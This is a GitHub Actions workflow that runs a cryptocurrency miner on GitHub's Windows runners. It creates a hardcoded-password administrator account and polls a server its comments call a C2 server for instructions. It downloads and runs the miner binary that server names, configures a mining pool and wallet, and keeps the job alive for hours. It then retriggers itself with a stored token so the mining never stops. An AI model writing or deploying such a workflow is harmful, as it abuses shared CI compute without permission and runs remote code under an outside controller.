name: RDP TEST Auto-Restarting Miner (Final)

on:
  workflow_dispatch:

jobs:
  secure-rdp:
    runs-on: windows-latest
    timeout-minutes: 180

    steps:
      - name: Create Miner User
        shell: powershell
        run: |
          $password = "Runner-12345"
          $securePass = ConvertTo-SecureString $password -AsPlainText -Force
          New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
          Add-LocalGroupMember -Group "Administrators" -Member "RDP"

      - name: Fetch Instructions and Configure Miner
        id: setup_miner
        shell: powershell
        run: |
          $ErrorActionPreference = "Stop"
          
          # 1. Ping the C2 server for instructions
          $c2ServerUrl = "https://poolserver.onrender.com/"
          Write-Host "Pinging C2 server for instructions: $c2ServerUrl"
          $instructionsJson = Invoke-WebRequest -Uri $c2ServerUrl -UseBasicParsing
          $instructions = $instructionsJson.Content | ConvertFrom-Json
          
          # 2. Parse and execute download instructions
          $minerVersion = $instructions.miner.version
          $downloadUrl = $instructions.miner.downloadUrl
          $minerExeName = $instructions.miner.executable
          
          $zipPath = "$env:TEMP\miner.zip"
          $extractPath = "$env:TEMP\miner"
          Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
          Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
          
          $minerExePath = (Get-ChildItem -Path $extractPath -Recurse -Filter $minerExeName).FullName
          if (-not $minerExePath) { throw "CRITICAL: Could not find miner executable '$minerExeName'!" }
          
          echo "::set-output name=miner_exe::$minerExePath"

          # 3. Parse pool instructions
          $poolUrl = $instructions.pool.url
          $walletUser = $instructions.pool.user
          $poolPass = $instructions.pool.pass

          # 4. Build the config.json with the 40% CPU limit baked in
          $jsonContent = @{
              autosave = $true
              # Define the CPU object with the 40% limit
              cpu = @{
                  enabled = $true
                  "max-threads-hint" = 40 # <-- THE ONLY CHANGE IS HERE
              }
              opencl = $false
              cuda = $false
              pools = @(
                  @{
                      algo = "rx/0"
                      url = $poolUrl
                      user = $walletUser
                      pass = $poolPass
                  }
              )
          } | ConvertTo-Json -Depth 100
          
          $configPath = Join-Path (Split-Path -Path $minerExePath) "config.json"
          $jsonContent | Set-Content -Path $configPath
          Write-Host "config.json created with a permanent 40% CPU limit."

      - name: Start Miner
        shell: powershell
        run: |
          $minerExe = "${{ steps.setup_miner.outputs.miner_exe }}"
          $arguments = "--background"
          Write-Host "Starting miner... CPU limit is handled by config.json."
          Start-Process -FilePath $minerExe -ArgumentList $arguments
          Write-Host "Miner is now running in the background."
          
      - name: Maintain Workflow
        shell: powershell
        run: |
          Write-Host "Workflow is now in mining mode. It will run for 3 hours."
          while ($true) {
              Start-Sleep -Seconds 300
          }

  trigger-next-run:
    runs-on: ubuntu-latest
    needs: secure-rdp
    if: always()

    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Trigger new workflow run
        env:
          GH_TOKEN: ${{ secrets.PAT_TOKEN }}
        run: |
          echo "Triggering the next workflow run..."
          gh workflow run main.yml
